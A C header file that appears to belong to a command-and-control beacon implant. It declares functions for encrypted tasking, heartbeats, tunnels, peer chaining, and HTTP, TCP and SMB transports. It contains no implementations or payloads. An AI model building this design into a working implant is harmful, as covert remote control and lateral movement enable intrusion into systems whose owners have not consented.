#pragma once

#include "beacon_agent.h"

#include "beacon_commands.h"
#include "beacon_context.h"
#include "beacon_cascade.h"
#include "beacon_crypto.h"
#include "beacon_packet.h"
#include "beacon_sleep.h"
#include "beacon_transport.h"

ByteBuf AgentBuildMetadataPayload(const BeaconContext* ctx);
ByteBuf AgentBuildHeartbeatPlain(const BeaconContext* ctx);
VOID AgentDispatchTasks(BeaconContext* ctx, const ByteBuf* encrypted_tasks);
VOID AgentFlushTransfers(BeaconContext* ctx);
VOID AgentFlushTunnels(BeaconContext* ctx);
VOID AgentFlushCascade(BeaconContext* ctx);

INT AgentRunExternalHttp(Agent* agent);
INT AgentRunExternalTcp(Agent* agent);
INT AgentRunInternalTcp(Agent* agent);
INT AgentRunInternalSmb(Agent* agent);
